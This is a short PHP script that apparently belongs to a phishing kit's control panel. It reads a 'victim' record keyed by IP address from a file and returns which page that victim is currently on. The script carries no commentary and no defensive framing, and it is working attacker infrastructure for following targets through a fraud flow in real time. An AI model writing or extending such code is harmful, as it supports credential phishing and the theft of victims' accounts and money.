<?php
require_once 'functions.php';

header('Content-Type: text/plain');
header('Cache-Control: no-cache, no-store, must-revalidate');

$ip = isset($_GET['ip']) ? $_GET['ip'] : '';

// Sanitize IP
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    echo 'unknown';
    exit;
}

// Get victim file path
$file = get_victim_file_path($ip);

$page = 'unknown';

if (file_exists($file)) {
    $data = @json_decode(@file_get_contents($file), true);
    if (is_array($data) && isset($data['current_page'])) {
        $page = $data['current_page'];
    }
}

echo $page;
?>
